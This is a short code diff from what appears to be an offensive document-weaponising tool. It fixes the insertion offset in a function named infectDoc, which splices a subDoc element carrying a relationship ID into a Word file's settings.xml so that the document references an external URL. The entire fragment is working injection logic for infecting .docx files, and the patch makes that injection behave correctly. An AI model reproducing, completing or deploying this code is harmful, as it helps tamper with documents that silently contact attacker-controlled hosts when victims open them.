@@ -176,9 +176,9 @@ def infectDoc(goodocx, badocx, url, identifier, reinfect=False):
         with ZipFile(badocx) as arc:
             with arc.open('word/settings.xml') as fr:
                 docx = fr.read()
-            closepos = docx.index('/>')
+            closepos = docx.index('/>')+2
             prepos = docx[:closepos]
-            editpos = '/><w:p><w:subDoc r:id="rId{}"/></w:p>'.format(identifier)
+            editpos = '<w:p><w:subDoc r:id="rId{}"/></w:p>'.format(identifier)
             postpos = docx[closepos:]
             settingsxml = "{}{}{}".format(prepos, editpos, postpos)
     with UpdateableZipFile(badocx, "a") as inj:
